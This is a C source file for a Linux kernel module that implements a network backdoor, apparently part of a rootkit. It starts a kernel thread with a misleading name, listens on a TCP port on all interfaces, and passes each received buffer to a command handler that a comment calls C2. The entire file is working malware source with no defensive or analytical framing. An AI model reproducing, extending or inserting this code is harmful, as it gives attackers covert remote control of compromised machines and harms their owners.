#include "backdoor.h"
#include "cmd.h"

static struct kbackdoor_t *bkdoor = NULL;

size_t backdoor_recv(struct socket *sock, struct sockaddr_in *addr, uint8_t *buf, size_t len)
{
	struct msghdr msghdr;
	struct iovec iov;
  mm_segment_t oldfs;
	int size = 0;

	if (sock->sk == NULL)
		return 0;

  // Setup IO vector for sock_recvmsg
	iov.iov_base = buf;
	iov.iov_len = len;

	msghdr.msg_name = addr;
	msghdr.msg_namelen = sizeof(struct sockaddr_in);
	msghdr.msg_iter.iov = &iov;
	msghdr.msg_control = NULL;
	msghdr.msg_controllen = 0;
	msghdr.msg_flags = 0;

  oldfs = get_fs();
  set_fs(KERNEL_DS);
	size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
  set_fs(oldfs);

	return size;
}

int backdoor_run(void *data)
{
  int err;
  uint8_t buffer[BKDOOR_BUF_SIZE];
  size_t size;

  // Set running state
  bkdoor->running = 1;

  // Create TCP socket server
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
  err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2,6,5)
  err = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#else
  err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#endif

  if (err < 0) {
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  // Setup sock_addr for socket to listen to
  memset(&bkdoor->addr, 0, sizeof(bkdoor->addr));
  bkdoor->addr.sin_family = AF_INET;
  bkdoor->addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bkdoor->addr.sin_port = htons(BKDOOR_PORT);

  // Bind socket server and check for errors
  err = kernel_bind(bkdoor->sock, (struct sockaddr*)&bkdoor->addr, sizeof(struct sockaddr));
  if (err < 0) {
    // Failed release this socket
    sock_release(bkdoor->sock);
    bkdoor->sock = NULL;
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  // Socket listen
  err = kernel_listen(bkdoor->sock, 0);
  if (err) {
    // Listen unsuccessful
    sock_release(bkdoor->sock);
    bkdoor->sock = NULL;
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  printk(KERN_INFO "Listen successful\n");

  // Create a socket to accept connections
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
    err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2,6,5)
    err = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
#else
    err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
#endif
  if (err < 0) {
    // Unable to create accept socket
    sock_release(bkdoor->sock);
    sock_release(bkdoor->conn);
    bkdoor->sock = NULL;
    bkdoor->conn = NULL;
    bkdoor->running = 0;
    return err;
  }

  // Main server loop
  for (;;) {
    // Check if exit required
    if (kthread_should_stop()) { do_exit(0); }

    // Clear buffer for writing
    memset(buffer, 0, BKDOOR_BUF_SIZE);

    // Wait for accept
    err = kernel_accept(bkdoor->sock, &bkdoor->conn, 0);
    if (err < 0) {
      // Error accepting connection
      break;
    }

    printk(KERN_INFO "Received a new connection\n");

    size = backdoor_recv(bkdoor->conn, &bkdoor->addr, buffer, sizeof(buffer));

    // If size < 0, connection probably closed
    if (size < 0) { break; }
    printk(KERN_INFO "Received some bytes from new connection\n");

    // Process command from C2
    handle_cmd(buffer, size);

    schedule();
  }

  return 0;
}

int backdoor_start(void)
{
  bkdoor = kmalloc(sizeof(struct kbackdoor_t), GFP_KERNEL);
  bkdoor->thread = kthread_run(&backdoor_run, NULL, "sohai check your mods");
  if (bkdoor->thread == NULL) {
    // Can't start thread
    kfree(bkdoor);
    bkdoor = NULL;
    return 1;
  }
  return 0;
}

int backdoor_stop(void)
{
	int err = 0;
	struct pid *pid = find_get_pid(bkdoor->thread->pid);
	struct task_struct *task = pid_task(pid, PIDTYPE_PID);

  // TODO: Implement cleaner exit
	// Kill backdoor
	if (bkdoor->thread != NULL) {
		err = send_sig(SIGKILL, task, 1);
    if (err > 0) {
			while (bkdoor->running == 1)
				msleep(50);
		}
	}

  // Should wait for thread to receive the signals first
  // Close sockets
	if (bkdoor->sock != NULL) {
    kernel_sock_shutdown(bkdoor->sock, SHUT_RDWR);
		sock_release(bkdoor->sock);
		bkdoor->sock = NULL;
	}
  if (bkdoor->conn != NULL) {
    sock_release(bkdoor->conn);
    bkdoor->conn = NULL;
  }
  printk(KERN_INFO "Socket shutdown successful\n");
  
  // Free memory
  kfree(bkdoor);
  bkdoor = NULL;

  return err;
}
